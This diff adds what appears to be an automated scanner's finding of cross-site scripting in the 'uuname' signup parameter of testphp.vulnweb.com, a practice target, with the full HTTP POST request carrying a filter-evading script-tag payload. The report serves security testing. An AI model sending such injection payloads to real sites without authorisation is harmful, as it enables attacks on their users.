@@ -1,0 +1,15 @@
+XSS vulnerability found via injection in the parameter uuname
+
+POST /secured/newuser.php HTTP/1.1
+host: testphp.vulnweb.com
+connection: keep-alive
+user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+accept-language: en-US
+accept-encoding: gzip, deflate, br
+accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+content-type: application/x-www-form-urlencoded
+referer: http://testphp.vulnweb.com/signup.php
+content-length: 204
+Content-Type: application/x-www-form-urlencoded
+
+uuname=%3CScRiPt%3Ealert%28%22wreu4vl9o9%22%29%3C%2FsCrIpT%3E&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=default&uemail=wapiti2021%40mailinator.com&uphone=default&signup=signup&uaddress=Hi%20there%21
